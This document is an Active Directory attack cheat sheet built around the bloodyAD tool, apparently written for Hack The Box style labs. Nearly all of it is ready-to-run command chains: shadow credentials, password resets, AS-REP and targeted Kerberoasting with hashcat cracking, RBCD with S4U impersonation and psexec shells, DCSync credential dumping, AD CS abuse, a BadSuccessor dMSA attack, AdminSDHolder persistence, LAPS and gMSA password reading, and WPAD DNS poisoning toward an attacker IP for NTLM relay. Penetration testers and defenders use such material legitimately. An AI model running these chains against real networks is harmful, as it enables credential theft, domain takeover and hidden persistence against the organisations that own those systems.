## Auth Methods

```bash
# Password
bloodyAD --host $IP -d $DOMAIN -u $USER -p 'Password01!'

# Pass-the-Hash — colon prefix mandatory, without it treated as literal string
bloodyAD --host $IP -d $DOMAIN -u $USER -p ':NTHASH'

# Kerberos with ccache
export KRB5CCNAME=/path/to/ticket.ccache
bloodyAD --host $DC -d $DOMAIN -u $USER -k

# Certificate (Schannel / PKINIT)
bloodyAD --host $DC -d $DOMAIN -u $USER -c 'path/to/key:path/to/cert'
```

## Step 0: Discovery

```bash
# Object-level — shows WRITE or CREATE_CHILD per object (start here)
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS get writable

# Attribute-level — shows exactly which attributes are writable
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS get writable --detail

# Grep detail output for actionable attributes only
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS get writable --detail | \
  grep -E 'distinguishedName|servicePrincipalName|msDS-KeyCredentialLink|userAccountControl|userPrincipalName|mail:|altSecurityIdentities|scriptPath|msTSInitialProgram|msDS-AllowedToActOnBehalfOfOtherIdentity|msDS-AllowedToDelegateTo|unicodePwd|nTSecurityDescriptor|isDeleted|member:'

# Filter by object type
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS get writable --otype USER
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS get writable --otype COMPUTER
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS get writable --otype GROUP
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS get writable --otype DOMAIN
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS get writable --otype GPO

# Filter by right type
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS get writable --right WRITE
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS get writable --right CHILD

# Deleted objects ARE included by default — suppress with:
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS get writable --exclude-del

# BloodHound-compatible output
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS get writable --bh
```

**What the output actually looks like:**

Without `--detail`:

```
distinguishedName: CN=msa_health,CN=Managed Service Accounts,DC=logging,DC=htb
permission: WRITE

distinguishedName: OU=Employees,DC=logging,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=logging.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=logging,DC=htb
dnsNode: CREATE_CHILD
```

With `--detail` on a user object:

```
distinguishedName: CN=Target User,OU=Employees,DC=domain,DC=htb
servicePrincipalName: WRITE
msDS-KeyCredentialLink: WRITE
userAccountControl: WRITE
altSecurityIdentities: WRITE
scriptPath: WRITE
userPrincipalName: WRITE
mail: WRITE
...
```

**GenericAll, WriteDACL, WriteOwner, ForceChangePassword do NOT appear in `get writable` output.** Those labels come from BloodHound or `get object --attr ntsecuritydescriptor --resolve-sd`. What you see in `get writable` is attribute names. Use the attribute map below to triage them.

## Step 1: Resolve the Target Identifier

`get writable` gives you a `distinguishedName`. Before running any abuse command, enumerate that DN with `get object` to get the `sAMAccountName`, `objectSid`, and key attributes.

**get writable surfaces the DN:**

```
distinguishedName: CN=msa_health,CN=Managed Service Accounts,DC=logging,DC=htb
permission: WRITE
```

**get object on that DN resolves identifiers:**

```bash
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS \
  get object "CN=msa_health,CN=Managed Service Accounts,DC=logging,DC=htb"
```

Output gives you `sAMAccountName: msa_health$`, `objectSid: S-1-5-21-...`, etc.

**Use any of the three forms in your abuse command — all are accepted interchangeably:**

```bash
# sAMAccountName — use this by default
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS add shadowCredentials 'msa_health$'

# Full DN — paste directly from get writable output
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS \
  add shadowCredentials "CN=msa_health,CN=Managed Service Accounts,DC=logging,DC=htb"

# SID — from objectSid in get object output
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS \
  add shadowCredentials 'S-1-5-21-4020823815-2796529489-1682170552-2113'
```

**For tombstoned objects — use `get search` with LDAP controls, not `get object`:**

`get object` returns `noSuchObject` on tombstones even with a correct DN — it doesn't pass the show-deleted control. Use `get search` instead:

```bash
# Returns sAMAccountName, SID, and name for all deleted objects you have rights on
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS get search \
  -c 1.2.840.113556.1.4.2064 \
  --filter '(isDeleted=TRUE)' \
  --attr sAMAccountName,objectSid,name
```

## Step 2: Attribute → Attack Map

Once you have the object identified, find your writable attribute below and jump to that chain.

|Priority|Attribute Writable|Attack|
|---|---|---|
|1|`msDS-KeyCredentialLink`|Shadow Credentials — stealthiest, no password change, reversible|
|2|`unicodePwd`|Direct password set — instant access if LDAPS available|
|3|`userAccountControl`|AS-REP roast, enable disabled account, delegation flags|
|4|`servicePrincipalName`|Targeted Kerberoast — offline crack, no direct account touch|
|5|`member` (on a group)|Add yourself to a privileged group|
|6|`nTSecurityDescriptor`|Full DACL control via `add genericAll` — opens everything else|
|7|`msDS-AllowedToActOnBehalfOfOtherIdentity`|RBCD — impersonate any user to that computer|
|8|`msDS-AllowedToDelegateTo`|Constrained delegation target — requires additional setup|
|9|`userPrincipalName`|ESC16 — only useful if AD CS in environment|
|10|`mail`|ESC14 — only useful if AD CS in environment|
|11|`altSecurityIdentities`|X.509 mapping — only useful if AD CS in environment|
|12|`scriptPath`|Logon script — requires victim to log in interactively|
|13|`msTSInitialProgram`|RDP startup — requires victim to RDP in|
|14|`isDeleted` + object in Deleted Objects|Tombstone reanimation — needs CREATE_CHILD on dest OU too|

**Priority reasoning:** Shadow credentials first — no password change, PKINIT gives NT hash directly, fully reversible. Fails only if DC schema is pre-2016 or PKINIT unavailable. `unicodePwd` second — one command to full access if LDAPS is up, but noisier. `nTSecurityDescriptor` unlocks everything — DACL control pivots to any other attack. AD CS attacks (9-11) require AD CS present and configured — verify first before going there. Logon script and RDP startup require live user activity — unreliable in static lab environments.

## Step 3: Run the Chain

---

### Chain 1 — Shadow Credentials (`msDS-KeyCredentialLink: WRITE`)

**Verify DC schema first:**

```bash
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS get object '' --attr domainControllerFunctionality
# Must be 7 or above (Windows Server 2016+)
```

```bash
# Add shadow credential — outputs .ccache TGT and .pfx
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS add shadowCredentials 'TARGET'

# Get NT hash from pfx
certipy auth -pfx TARGET.pfx -dc-ip $IP -domain $DOMAIN

# PTH with recovered hash
bloodyAD --host $IP -d $DOMAIN -u 'TARGET' -p ':NTHASH' get writable
nxc smb $IP -u 'TARGET' -H NTHASH

# Cleanup
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS remove shadowCredentials 'TARGET'
```

---

### Chain 2 — Password Reset (`unicodePwd: WRITE` or object-level `permission: WRITE`)

```bash
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS set password 'TARGET' 'Password01!'

# Verify
nxc smb $IP -u 'TARGET' -p 'Password01!'
evil-winrm -i $IP -u 'TARGET' -p 'Password01!'
```

**Alternatives if bloodyAD fails (LDAPS requirement on unicodePwd):**

```bash
rpcclient -U "$USER%$PASS" $IP -c 'setuserinfo2 TARGET 23 Password01!'
net rpc password TARGET 'Password01!' -U "$DOMAIN/$USER%$PASS" -S $IP
impacket-changepasswd "$DOMAIN/$USER:$PASS@$IP" -newpass 'Password01!' -dc-ip $IP -reset
```

---

### Chain 3 — AS-REP Roast (`userAccountControl: WRITE`)

```bash
# Set flag
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS add uac 'TARGET' -f DONT_REQ_PREAUTH

# Verify
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS get object 'TARGET' --attr userAccountControl

# Roast
impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -dc-ip $IP -no-pass

# Crack
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt

# Cleanup
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS remove uac 'TARGET' -f DONT_REQ_PREAUTH
```

---

### Chain 4 — Enable Disabled Account (`userAccountControl: WRITE`)

```bash
# Check current flags
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS get object 'TARGET' --attr userAccountControl

# Enable
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS remove uac 'TARGET' -f ACCOUNTDISABLE

# Verify then reset password or add shadow creds
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS set password 'TARGET' 'Password01!'
```

---

### Chain 5 — Delegation Flags (`userAccountControl: WRITE`)

```bash
# Constrained delegation with protocol transition (S4U2Self + S4U2Proxy)
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS add uac 'TARGET' -f TRUSTED_TO_AUTH_FOR_DELEGATION

# Set delegation target service
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS \
  set object 'TARGET' msDS-AllowedToDelegateTo -v 'cifs/DC.domain.htb'

# Unconstrained delegation — requires SeEnableDelegation on DC, usually fails for non-admins
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS add uac 'TARGET_COMPUTER$' -f TRUSTED_FOR_DELEGATION

# Cleanup
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS remove uac 'TARGET' -f TRUSTED_TO_AUTH_FOR_DELEGATION
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS remove uac 'TARGET_COMPUTER$' -f TRUSTED_FOR_DELEGATION
```

---

### Chain 6 — Targeted Kerberoast (`servicePrincipalName: WRITE`)

```bash
# Check if SPN already exists
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS get object 'TARGET' --attr servicePrincipalName

# Write SPN
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS \
  set object 'TARGET' servicePrincipalName -v 'cifs/fake'

# Roast
nxc ldap $IP -u $USER -p $PASS --kerberoasting hash.txt

# Crack
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt   # RC4 (etype 23)
hashcat -m 19700 hash.txt /usr/share/wordlists/rockyou.txt   # AES256 (etype 18)

# Cleanup — no -v flag = delete the attribute
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS set object 'TARGET' servicePrincipalName

# Verify cleanup
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS get object 'TARGET' --attr servicePrincipalName
```

---

### Chain 7 — Group Membership (`member: WRITE` on a group object)

```bash
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS add groupMember 'GROUP_TARGET' 'YOUR_USER'

# Verify
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS get object 'GROUP_TARGET' --attr member

# New membership only applies in a NEW logon session — re-authenticate after adding yourself

# Cleanup
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS remove groupMember 'GROUP_TARGET' 'YOUR_USER'
```

**NOTE:** WRITE on a group = control over the group object (membership, properties). It does NOT give WRITE over the group's member accounts. Those are separate ACEs.

---

### Chain 8 — WriteDACL (`nTSecurityDescriptor: WRITE`)

```bash
# Grant yourself full control on the object
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS add genericAll 'TARGET' 'YOUR_USER'

# Now run any chain above against TARGET

# Cleanup
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS remove genericAll 'TARGET' 'YOUR_USER'
```

**If `nTSecurityDescriptor: WRITE` is on the domain object (`DC=domain,DC=htb`):**

```bash
# Go straight to DCSync — no need for genericAll
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS add dcsync 'YOUR_USER'
impacket-secretsdump "$DOMAIN/$USER:$PASS@$IP" -just-dc-ntlm

# Cleanup
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS remove dcsync 'YOUR_USER'
```

### Chain 9 — RBCD (`msDS-AllowedToActOnBehalfOfOtherIdentity: WRITE`)

```bash
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS add rbcd 'TARGET_COMPUTER$' 'CONTROLLED_ACCOUNT$'

# Verify
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS get object 'TARGET_COMPUTER$' \
  --attr msDS-AllowedToActOnBehalfOfOtherIdentity

# S4U impersonation
impacket-getST -spn 'cifs/TARGET_COMPUTER' -impersonate Administrator \
  "$DOMAIN/CONTROLLED_ACCOUNT\$:Password01!" -dc-ip $IP
export KRB5CCNAME=Administrator@cifs_TARGET_COMPUTER@DOMAIN.ccache
impacket-psexec -k -no-pass "$DOMAIN/Administrator@TARGET_COMPUTER"

# Cleanup
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS remove rbcd 'TARGET_COMPUTER$' 'CONTROLLED_ACCOUNT$'
```

### Chain 10 — AD CS Attribute Abuse

**Check AD CS is present before attempting any of these.**

**ESC16 — UPN spoofing (`userPrincipalName: WRITE`)**

```bash
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS \
  set object 'TARGET' userPrincipalName -v 'administrator@domain.htb'

# Get certificate as administrator via certipy
# RESTORE UPN before running certipy auth — leaving it spoofed breaks auth
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS \
  set object 'TARGET' userPrincipalName -v 'target@domain.htb'
```

**ESC14 — mail attribute (`mail: WRITE`)**

```bash
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS \
  set object 'TARGET' mail -v 'administrator@domain.htb'
```

**X.509 mapping (`altSecurityIdentities: WRITE`)**

```bash
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS \
  set object 'TARGET' altSecurityIdentities -v 'X509:<RFC822>administrator@domain.htb'
```

## When You See: `permission: WRITE` (no --detail)

Object-level WRITE without detail = broad write access. Try in order:

```bash
# 1. Shadow credentials (stealthiest)
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS add shadowCredentials 'TARGET'

# 2. Password reset (if PKINIT unavailable or shadow creds fails)
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS set password 'TARGET' 'Password01!'

# 3. SPN write → Kerberoast (if service account — don't break it with a password reset)
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS \
  set object 'TARGET' servicePrincipalName -v 'cifs/fake'
```

## When You See: `permission: CREATE_CHILD` on an OU

**DNS record injection (`dnsNode: CREATE_CHILD`):**

```bash
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS add dnsRecord HOSTNAME $ATTACKER_IP
# Cleanup
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS remove dnsRecord HOSTNAME $ATTACKER_IP
```

**Create computer account:**

```bash
# Check domain-wide MAQ first
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS get object 'DC=domain,DC=htb' \
  --attr ms-DS-MachineAccountQuota

# Create — hostname WITHOUT trailing $
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS add computer FAKE01 'Password01!'

# With specific OU
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS add computer FAKE01 'Password01!' \
  --ou 'OU=Employees,DC=domain,DC=htb'
```

**Tombstone reanimation (requires WRITE on deleted obj AND CREATE_CHILD on dest OU):**

Both must appear in `get writable` output — if only one is present, restore will fail.

```bash
# Enumerate deleted objects — use get search with LDAP controls, NOT get object
# get object returns noSuchObject on tombstones regardless of correct DN
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS get search \
  -c 1.2.840.113556.1.4.2064 \
  --filter '(isDeleted=TRUE)' \
  --attr sAMAccountName,objectSid,name

# Restore by sAMAccountName or SID (SID more reliable when name is mangled by \0ADEL:)
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS set restore 'deleted.user'
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS set restore 'S-1-5-21-...-1104'

# Restore to specific OU if last known parent unavailable
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS set restore 'deleted.user' \
  --newParent 'OU=Employees,DC=domain,DC=htb'

# Reset password
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS set password 'deleted.user' 'Password01!'

# Known bug: set restore broken in v2.4.2 — downgrade to v2.3.2 if you get permissions error

# Recycle Bin enabled → all attributes + group memberships restored
# Tombstoned only → SID + ACLs restored, group memberships LOST — re-add manually:
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS add groupMember 'TARGET_GROUP' 'deleted.user'

# Enumerate restored account
bloodyAD --host $IP -d $DOMAIN -u 'deleted.user' -p 'Password01!' get writable
```

**BadSuccessor / dMSA (Windows Server 2025 only, CVE-2025-26857):**

CREATE_CHILD on any OU also enables this if DC is unpatched WS2025.

```bash
# Check first
nxc ldap $IP -u $USER -p $PASS -M badsuccessor
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS msldap badsuccessor_check

# Create dMSA linked to Administrator by default
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS add badSuccessor 'pentest_dmsa'

# Link to specific target
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS add badSuccessor 'pentest_dmsa' \
  -t 'CN=Administrator,CN=Users,DC=domain,DC=htb'

# Use the TGT saved as .ccache
export KRB5CCNAME=pentest_dmsa.ccache
impacket-secretsdump -k -no-pass "pentest_dmsa\$@$DC"

# Cleanup — must delete the dMSA object entirely, partial fixes don't work
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS remove object 'pentest_dmsa$'
```

## When You See WriteOwner (BloodHound / --resolve-sd only)

`get writable` does not print "WriteOwner". You'll see it via BloodHound or:

```bash
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS get object 'TARGET' \
  --attr ntsecuritydescriptor --resolve-sd
```

**Critical constraint:** WriteOwner only lets you set yourself as owner — not an arbitrary user.

```bash
# Set yourself as owner
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS set owner 'TARGET' 'YOUR_USER'

# As owner you have implicit WriteDACL — grant yourself full control
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS add genericAll 'TARGET' 'YOUR_USER'

# Run any chain above

# Cleanup
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS remove genericAll 'TARGET' 'YOUR_USER'
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS set owner 'TARGET' 'ORIGINAL_OWNER'
```

## Reading Credentials (No WRITE Needed)

### LAPS Legacy

```bash
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS get search \
  --filter '(ms-mcs-admpwdexpirationtime=*)' \
  --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime

bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS get object 'COMPUTER$' --attr ms-Mcs-AdmPwd
```

### LAPS v2 (Windows LAPS — different attributes)

```bash
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS get object 'COMPUTER$' --attr msLAPS-Password
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS get object 'COMPUTER$' --attr msLAPS-EncryptedPassword

# nxc handles both versions automatically
nxc ldap $IP -u $USER -p $PASS -M laps
```

**Follow-up:**

```bash
nxc smb $IP -u 'Administrator' -p '<laps_password>'
nxc smb $IP -u 'Administrator' -p '<laps_password>' --sam
```

### gMSA

```bash
# Only works if you're in PrincipalsAllowedToRetrieveManagedPassword
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS get object 'GMSA$' --attr msDS-ManagedPassword

# Discovery
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS get search \
  --filter '(objectClass=msDS-GroupManagedServiceAccount)'

# msldap alternative
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS msldap gmsa
```

**Follow-up:**

```bash
# bloodyAD decodes blob and shows NT hash directly
nxc smb $IP -u 'GMSA$' -H NTHASH
bloodyAD --host $IP -d $DOMAIN -u 'GMSA$' -p ':NTHASH' get writable
```

## DCSync (Endgame)

**Requirement:** `nTSecurityDescriptor: WRITE` on the domain object.

```bash
# Grant DCSync — trustee argument only, no domain DN
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS add dcsync 'YOUR_USER'

impacket-secretsdump "$DOMAIN/$USER:$PASS@$IP" -just-dc
impacket-secretsdump "$DOMAIN/$USER:$PASS@$IP" -just-dc-ntlm

# Cleanup
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS remove dcsync 'YOUR_USER'
```

## AdminSDHolder Persistence

**Requirement:** DA-level access already. SDProp runs every ~60 minutes and propagates AdminSDHolder's ACL to all adminCount=1 objects across the domain.

```bash
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS \
  add genericAll 'CN=AdminSDHolder,CN=System,DC=domain,DC=htb' 'YOUR_USER'

# Verify after up to 60 min
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS get object 'Administrator' \
  --attr ntsecuritydescriptor --resolve-sd
```

Defenders who clean individual DA accounts leave the AdminSDHolder ACE intact — SDProp re-adds it on the next cycle. Cleanup requires removing the ACE from AdminSDHolder itself.

## Common Chains (Full Sequences)

### WRITE → Shadow Creds → PTH → Enumerate

```bash
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS add shadowCredentials 'TARGET'
certipy auth -pfx TARGET.pfx -dc-ip $IP -domain $DOMAIN
bloodyAD --host $IP -d $DOMAIN -u 'TARGET' -p ':NTHASH' get writable
```

### WRITE → SPN → Kerberoast → Crack → Cleanup

```bash
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS set object 'TARGET' servicePrincipalName -v 'cifs/fake'
nxc ldap $IP -u $USER -p $PASS --kerberoasting hash.txt
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS set object 'TARGET' servicePrincipalName
```

### nTSecurityDescriptor WRITE → genericAll → Abuse

```bash
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS add genericAll 'TARGET' 'YOUR_USER'
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS set password 'TARGET' 'Password01!'
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS remove genericAll 'TARGET' 'YOUR_USER'
```

### WriteOwner (BH) → set owner → genericAll → Shadow Creds

```bash
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS set owner 'TARGET' 'YOUR_USER'
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS add genericAll 'TARGET' 'YOUR_USER'
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS add shadowCredentials 'TARGET'
```

### Tombstone: WRITE on deleted + CREATE_CHILD on OU → Reanimate

```bash
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS get search \
  -c 1.2.840.113556.1.4.2064 \
  --filter '(isDeleted=TRUE)' --attr sAMAccountName,objectSid,name
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS set restore 'deleted.user'
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS set password 'deleted.user' 'Password01!'
bloodyAD --host $IP -d $DOMAIN -u 'deleted.user' -p 'Password01!' get writable
```

### CREATE_CHILD DNS → Poison → Relay → Cleanup

```bash
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS add dnsRecord wpad $ATTACKER_IP
ntlmrelayx.py -t ldap://$IP --escalate-user $USER
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS remove dnsRecord wpad $ATTACKER_IP
```

### Computer CREATE → RBCD → S4U → Shell

```bash
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS add computer FAKE01 'Password01!'
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS add rbcd 'TARGET_COMPUTER$' 'FAKE01$'
impacket-getST -spn 'cifs/TARGET_COMPUTER' -impersonate Administrator \
  "$DOMAIN/FAKE01\$:Password01!" -dc-ip $IP
export KRB5CCNAME=Administrator@cifs_TARGET_COMPUTER@DOMAIN.ccache
impacket-psexec -k -no-pass "$DOMAIN/Administrator@TARGET_COMPUTER"
bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASS remove rbcd 'TARGET_COMPUTER$' 'FAKE01$'
```
